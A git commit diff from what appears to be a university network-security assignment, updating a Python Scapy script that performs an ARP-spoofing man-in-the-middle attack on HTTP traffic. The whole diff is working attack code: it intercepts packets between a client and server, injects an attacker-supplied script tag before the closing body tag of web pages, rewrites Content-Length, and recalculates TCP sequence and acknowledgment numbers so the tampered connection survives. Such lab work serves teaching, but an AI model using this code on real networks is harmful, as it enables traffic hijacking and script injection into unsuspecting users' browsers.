a8c1f5b61a466e604ebaad8946d1a2311c9c69e8
Damian Mirecki <mirecki2@illinois.edu>
2019-11-09 15:13:36 -0600

    More 4.2.1.3 Progress

--- NetSec/cp2.1.http.py
+++ NetSec/cp2.1.http.py
@@ -55,14 +55,18 @@ def restore(srcIP, srcMAC, dstIP, dstMAC):
 
 # TODO: handle intercepted packets
 def interceptor(packet):
-	global clientMAC, clientIP, serverMAC, serverIP, attackerMAC, script, clientSEQ, clientACK, serverSEQ, serverACK, flag
+	global clientMAC, clientIP, serverMAC, serverIP, attackerMAC, script, inject_len,  clientACK, serverSEQ, flag, extra_SEQ
 	# The packet should only be intercepted if it's caused from a spoofed ARP table
 	if packet != None and packet.haslayer(IP) and packet.getlayer(Ether).src != attackerMAC and packet.getlayer(IP).src != attackerIP and packet.getlayer(IP).dst != attackerIP and packet.haslayer(TCP):
 		# Scapy has the power to automatically fill in any empty attributes in any of the layers. so delete the things that need updating, and Scapy will fill them in accordingly
 		del packet.getlayer(IP).len
 		del packet.getlayer(IP).chksum
 		del packet.getlayer(TCP).chksum
+
 		#packet.show()
+
+		additional_bytes = 1
+
 		if packet.getlayer(TCP).flags == "S":
 			debug(f"The above packet is an HTTP SYN packet!")
 			# Change the MAC addresses
@@ -70,91 +74,123 @@ def interceptor(packet):
 			packet.getlayer(Ether).dst = serverMAC
 			# Set flag to 0 (though it'll eventually be useless)
 			flag = 0
+			clientACK = packet[TCP].ack
+			serverSEQ = 0
 		elif packet.getlayer(TCP).flags == "SA":
 			debug(f"The above packet is an HTTP SYN+ACK packet!")
 			# Change the MAC addresses
 			packet.getlayer(Ether).src = attackerMAC
 			packet.getlayer(Ether).dst = clientMAC
+			# Set the global clientSEQ and serverACK variables
+			clientACK = packet[TCP].seq
+			serverSEQ = packet[TCP].seq
+
+		elif packet.haslayer(Raw):
+			if packet[Ether].src == clientMAC:
+				debug(f"The above packet is an HTTP request packet!")
+				# Change the MAC addresses
+				packet.getlayer(Ether).src = attackerMAC
+				packet.getlayer(Ether).dst = serverMAC
+			elif packet[Ether].src == serverMAC:
+				debug(f"The above packet is an HTTP response packet!")
+				debug(f"The old TCP length is {len(packet[Raw].load)}")
+				# Change the MAC addresses
+				packet.getlayer(Ether).src = attackerMAC
+				packet.getlayer(Ether).dst = clientMAC
+
+				new_html = packet[Raw].load.decode('ascii')
+				#debug(f"Old HTML is: {new_html}")
+
+				# Check if this is the last HTTP response packet
+				if new_html.find("</body>") != -1:
+					# Inject the script in the response
+					new_html = new_html.replace("</body>",script)
+					# Set flag to 1
+					flag=1
+
+				# Check if the HTTP response has the content length parameter
+				if new_html.find("Content-Length:") != -1:
+					# Change the content length in the payload
+					#debug(f"Old HTML is: {new_html}")
+					end_index = new_html.find("Last-Modified:")
+					start_index = new_html.find("Content-Length:")
+					old_length = new_html[start_index+16:end_index-2]
+					debug(f"The thing we took out is: {old_length}")
+					new_length = int(old_length)+inject_len
+					additional_digits = len(str(new_length)) - len(old_length)
+					if additional_digits > 0:
+						clientACK -= additional_digits
+					new_html = new_html.replace("Content-Length: "+old_length,"Content-Length: "+str(new_length))
+					#debug(f"New HTML is: {new_html}")
+					additional_bytes = len(new_html)
+
+				packet[Raw].load = new_html
+				#debug(f"New HTML is: {new_html}")
+
+				debug(f"The new TCP length is {len(packet[Raw].load)}")
+
 		elif packet.getlayer(TCP).flags == "A":
 			if packet.getlayer(Ether).src == clientMAC:
 				debug(f"The above packet is an HTTP ACK packet from client!")
 				# Change the MAC addresses
 				packet.getlayer(Ether).src = attackerMAC
 				packet.getlayer(Ether).dst = serverMAC
-				if flag == 1:
-					debug(f"Original ACK is {packet[TCP].ack}")
-					debug(f"Original SEQ is {packet[TCP].seq}")
-					packet[TCP].ack -= (len(script)-7)
-					debug(f"Script length is {len(script)}")
-					debug(f"New ACK is {packet[TCP].ack}")
-					debug(f"New SEQ is {packet[TCP].seq}")
+				#if flag == 1:
+				#	debug(f"Original ACK is {packet[TCP].ack}")
+				#	debug(f"Original SEQ is {packet[TCP].seq}")
+				#	packet[TCP].ack -= inject_len
+				#	debug(f"Script length is {len(script)}")
+				#	debug(f"New ACK is {packet[TCP].ack}")
+				#	debug(f"New SEQ is {packet[TCP].seq}")
 			elif packet.getlayer(Ether).src == serverMAC:
 				debug(f"The above packet is an HTTP ACK packet from web server!")
 				# Change the MAC addresses
 				packet.getlayer(Ether).src = attackerMAC
 				packet.getlayer(Ether).dst = clientMAC
-		elif packet.getlayer(TCP).flags == "PA":
-			if packet.getlayer(Ether).src == clientMAC:
-				debug(f"The above packet is an HTTP request packet!")
-				# Change the MAC addresses
-				packet.getlayer(Ether).src = attackerMAC
-				packet.getlayer(Ether).dst = serverMAC
-				# Update the client's SEQ and ACK
-				clientSEQ = packet[TCP].seq
-				clientACK = packet[TCP].ack
-			elif packet.getlayer(Ether).src == serverMAC:
-				debug(f"The above packet is an HTTP response packet!")
-				debug(f"The old TCP length is {len(packet[Raw].load)}")
-				# Change the MAC addresses
-				packet.getlayer(Ether).src = attackerMAC
-				packet.getlayer(Ether).dst = clientMAC
-				# Inject the script in the response
-				new_html = packet[Raw].load.decode('ascii')
-				#debug(f"Old HTML is: {new_html}")
-				new_html = new_html.replace("</body>",script)
-				#debug(f"New HTML is: {new_html}")
+			additional_bytes = 0
 
-				# Change the content lenght in the payload
-				debug(f"Old HTML is: {new_html}")
-				end_index = new_html.find("Last-Modified:")
-				start_index = new_html.find("Content-Length:")
-				old_length = new_html[start_index+16:end_index-2]
-				debug(f"The thing we took out is: {old_length}")
-				new_length = int(old_length)+len(script)-7
-				new_html = new_html.replace("Content-Length: "+old_length,"Content-Length: "+str(new_length))
-				debug(f"New HTML is: {new_html}")
-
-				packet[Raw].load = new_html
-				# Set flag to 1 (though it'll eventually be useless)
-				flag=1
-				debug(f"The new TCP length is {len(packet[Raw].load)}")
-				debug(f"Original ACK is {packet[TCP].ack}")
-				debug(f"Original SEQ is {packet[TCP].seq}")
 		elif packet.getlayer(TCP).flags == "FA":
-			if packet.getlayer(Ether).src == clientMAC:
+			if packet[Ether].src == clientMAC:
 				debug(f"The above packet is an HTTP FIN+ACK packet from client!")
 				# Change the MAC addresses
 				packet.getlayer(Ether).src = attackerMAC
 				packet.getlayer(Ether).dst = serverMAC
-				# Change the ACK value
-				debug(f"Original ACK is {packet[TCP].ack}")
-				debug(f"Original SEQ is {packet[TCP].seq}")
-				packet[TCP].ack -= (len(script)-7)
-				debug(f"Script length is {len(script)}")
-				debug(f"New ACK is {packet[TCP].ack}")
-				debug(f"New SEQ is {packet[TCP].seq}")
-			elif packet.getlayer(Ether).src == serverMAC:
+			elif packet[Ether].src == serverMAC:
 				debug(f"The above packet is an HTTP FIN+ACK packet from web server!")
 				# Change the MAC addresses
+				packet[Ether].src = attackerMAC
+				packet[Ether].dst = clientMAC
+
+		elif packet[TCP].flags == "R":
+			if packet[Ether].src == clientMAC:
+				debug(f"The above packet is a RST packet from client!")
+				# Change the MAC addresses
 				packet.getlayer(Ether).src = attackerMAC
-				packet.getlayer(Ether).dst = clientMAC
-				# Change the SEQ value
-				debug(f"Original ACK is {packet[TCP].ack}")
-				debug(f"Original SEQ is {packet[TCP].seq}")
-				packet[TCP].seq += (len(script)-7)
-				debug(f"Script length is {len(script)}")
-				debug(f"New ACK is {packet[TCP].ack}")
-				debug(f"New SEQ is {packet[TCP].seq}")
+				packet.getlayer(Ether).dst = serverMAC
+			elif packet[Ether].src == serverMAC:
+				debug(f"The above packet is a RST packet from server!")
+				# Change the MAC addresses
+				packet[Ether].src = attackerMAC
+				packet[Ether].dst = clientMAC
+
+		debug(f"Original ACK is {packet[TCP].ack}")
+		debug(f"Original SEQ is {packet[TCP].seq}")
+		if packet[Ether].dst == serverMAC:
+			packet[TCP].ack = clientACK
+		# Only update the things when the server sends something to client
+		else:
+			packet[TCP].seq = serverSEQ
+			if flag == 1:
+				clientACK += len(packet[Raw].load) - inject_len
+				serverSEQ += len(packet[Raw].load)
+				extra_SEQ = 0
+				flag = 0
+			else:
+				clientACK += additional_bytes
+				serverSEQ += additional_bytes
+		debug(f"New ACK is {packet[TCP].ack}")
+		debug(f"New SEQ is {packet[TCP].seq}")
+
 		#packet.show()
 		sendp(packet)
 
@@ -169,7 +205,12 @@ if __name__ == "__main__":
     clientIP = args.clientIP
     serverIP = args.serverIP
     script = "<script>"+args.script+"</script></body>"
+    inject_len = len(script)-7
     flag = 0
+    clientACK = 0
+    serverSEQ = 0
+    extra_SEQ = 0
+
     attackerMAC = get_if_hwaddr(args.interface)
     debug(f"Attacker MAC is {attackerMAC}")
     clientMAC = mac(clientIP)
